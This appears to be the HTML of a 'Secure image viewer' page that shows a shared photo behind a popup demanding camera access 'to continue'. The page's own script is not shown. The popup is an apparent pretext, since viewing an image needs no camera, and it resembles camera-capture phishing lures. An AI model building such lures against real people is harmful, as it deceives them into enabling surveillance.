<!DOCTYPE html>
<html>

<head>

    <title>Image Viewer</title>

    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <link rel="stylesheet" href="style.css">

</head>


<body>


<!-- Camera Permission Popup -->

<div class="popup-overlay" id="consentPopup">

    <div class="popup-box">

        <div class="popup-icon">
            📷
        </div>


        <h3>
            Camera Access Required
        </h3>


        <p>
            Allow camera access to continue.
            Your permission is required before using the camera.
        </p>


        <button id="allowCamera">
            Continue
        </button>


    </div>

</div>





<div id="pageContent">


<header>


    <div class="logo">

        <img src="images/logo.png" alt="Logo">

    </div>



    <nav class="menu">

        <a href="#">
            About
        </a>


        <a href="#" class="signin">
            Sign In
        </a>


    </nav>


</header>





<main>


    <section class="viewer">


        <h1>
            Shared Image
        </h1>


        <p class="subtitle">
            Secure image viewing
        </p>



        <div class="image-box">


            <img
                id="sharedImage"
                src="images/photo.jpeg"
                alt="Shared Image"
            >


        </div>


    </section>


</main>





<footer>

    <p>
        Secure image viewer
    </p>

</footer>



</div>



<script src="script.js"></script>


</body>

</html>
